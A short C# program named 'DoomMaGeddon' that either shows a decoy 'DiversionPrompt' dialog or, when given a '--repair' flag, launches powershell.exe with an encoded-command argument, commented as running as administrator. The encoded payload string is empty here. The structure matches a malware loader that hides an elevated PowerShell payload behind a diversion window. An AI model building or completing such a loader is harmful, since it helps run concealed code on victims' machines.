using System;
using System.Linq;
using System.Diagnostics;

class DoomMaGeddon
{
    static void Main(string[] args)
    {
        if (!args.Contains("--repair"))
        {
            DiversionPrompt dp = new DiversionPrompt();
            dp.ShowDialog();
        } else {
            string l = "";
            // runs as administrator
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-e " + l,
                UseShellExecute = true
            };
            Process.Start(psi);
        }
    }
}